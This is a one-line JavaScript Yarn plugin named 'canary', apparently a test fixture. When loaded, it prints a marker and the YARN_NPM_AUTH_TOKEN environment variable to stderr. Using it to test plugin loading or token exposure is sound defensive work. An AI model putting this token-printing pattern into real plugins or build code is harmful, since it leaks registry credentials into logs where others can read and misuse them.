module.exports = {name: "canary", factory: () => { console.error("CANARY-PLUGIN-LOADED token=[" + (process.env.YARN_NPM_AUTH_TOKEN || "") + "]"); return {}; }};
